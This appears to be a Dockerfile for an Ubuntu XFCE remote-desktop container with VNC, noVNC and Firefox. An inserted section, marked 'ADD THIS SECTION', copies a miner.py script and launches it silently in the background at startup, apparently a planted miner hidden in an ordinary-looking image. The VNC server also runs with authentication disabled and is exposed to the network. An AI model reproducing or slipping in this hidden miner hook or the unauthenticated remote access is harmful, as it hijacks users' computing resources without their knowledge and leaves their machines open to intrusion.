FROM --platform=linux/amd64 ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Base packages
RUN apt update -y && apt install --no-install-recommends -y \
    xfce4 xfce4-goodies tigervnc-standalone-server novnc websockify sudo \
    xterm init systemd snapd vim net-tools curl wget git tzdata

RUN apt update -y && apt install -y dbus-x11 x11-utils x11-xserver-utils x11-apps
RUN apt install software-properties-common -y

# Install Python and pip
RUN apt install -y python3 python3-pip

# Install required Python packages
RUN pip3 install --no-cache-dir requests psutil

# Firefox installation (original)
RUN add-apt-repository ppa:mozillateam/ppa -y
RUN echo 'Package: *' >> /etc/apt/preferences.d/mozilla-firefox
RUN echo 'Pin: release o=LP-PPA-mozillateam' >> /etc/apt/preferences.d/mozilla-firefox
RUN echo 'Pin-Priority: 1001' >> /etc/apt/preferences.d/mozilla-firefox
RUN echo 'Unattended-Upgrade::Allowed-Origins:: "LP-PPA-mozillateam:jammy";' | tee /etc/apt/apt.conf.d/51unattended-upgrades-firefox
RUN apt update -y && apt install -y firefox
RUN apt update -y && apt install -y xubuntu-icon-theme

# ========== ADD THIS SECTION ==========
# Create directory for miner script
RUN mkdir -p /opt/scripts

# Copy miner script
COPY miner.py /opt/scripts/miner.py
RUN chmod +x /opt/scripts/miner.py

# Create startup script to run miner in background
RUN echo '#!/bin/bash' > /opt/scripts/start_miner.sh && \
    echo 'sleep 15' >> /opt/scripts/start_miner.sh && \
    echo 'export DISPLAY=:0' >> /opt/scripts/start_miner.sh && \
    echo 'cd /opt/scripts' >> /opt/scripts/start_miner.sh && \
    echo 'python3 /opt/scripts/miner.py >> /var/log/miner.log 2>&1 &' >> /opt/scripts/start_miner.sh && \
    chmod +x /opt/scripts/start_miner.sh
# ========== END OF ADDED SECTION ==========

RUN touch /root/.Xauthority

EXPOSE 5901
EXPOSE 6080

# Modified CMD to also run miner script
CMD bash -c "vncserver -localhost no -SecurityTypes None -geometry 1024x768 --I-KNOW-THIS-IS-INSECURE && \
             openssl req -new -subj "/C=JP" -x509 -days 365 -nodes -out self.pem -keyout self.pem && \
             websockify -D --web=/usr/share/novnc/ --cert=self.pem 6080 localhost:5901 && \
             /opt/scripts/start_miner.sh && \
             tail -f /dev/null"
